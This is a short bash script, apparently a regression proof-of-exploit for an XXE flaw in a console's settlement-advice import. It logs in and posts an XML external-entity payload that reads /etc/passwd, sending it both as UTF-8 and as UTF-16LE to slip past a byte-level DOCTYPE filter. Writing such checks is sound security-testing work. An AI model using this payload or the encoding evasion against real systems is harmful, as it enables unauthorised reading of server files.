#!/usr/bin/env bash
set -euo pipefail
# LG-XXE-001 proof-of-exploit: XML external entity injection in the console settlement-advice import.
# Signs on for a real session, then POSTs an XML advice whose DOCTYPE declares an external SYSTEM
# entity pointing at /etc/passwd and references it in <memo>. With correspondent_advices=on the
# parser resolves the entity and echoes the file contents back; fires (exit 0) when the response
# contains a 'root:' line. Sends the advice in UTF-8 and again in UTF-16LE with a BOM (which hides
# '<!DOCTYPE' from a byte search), so a byte-only DTD check fires this under baseline too. With the
# fix the DTD is refused in either encoding (400). Hits the console directly. Env: PASCAL_URL (:8085).

PASCAL_URL="${PASCAL_URL:-http://localhost:8085}"
JAR="$(mktemp)"
U16="$(mktemp)"
trap 'rm -f "$JAR" "$U16"' EXIT

curl -sS -c "$JAR" -X POST "$PASCAL_URL/login" \
  --data-urlencode 'staff_id=TLR001' --data-urlencode 'password=teller-pw' >/dev/null

payload='<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><advice><memo>&x;</memo></advice>'
python3 -c '
import sys
x = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" + sys.argv[1].split("?>", 1)[1]
open(sys.argv[2], "wb").write(b"\xff\xfe" + x.encode("utf-16-le"))' "$payload" "$U16"

for body in "$payload" "@$U16"; do  # curl reads "@file" as the file's bytes
  resp="$(curl -sS -b "$JAR" -X POST "$PASCAL_URL/import" -H 'content-type: application/xml' --data-binary "$body")"
  if printf '%s' "$resp" | grep -q 'root:'; then
    enc="UTF-8"; [ "${body#@}" != "$body" ] && enc="UTF-16LE"
    echo "LG-XXE-001 FIRED ($enc): external entity resolved, /etc/passwd leaked -> $(printf '%s' "$resp" | head -1 | cut -c1-80)"
    exit 0
  fi
done
echo "LG-XXE-001 not fired: $(printf '%s' "$resp" | head -c 200)" >&2
exit 1
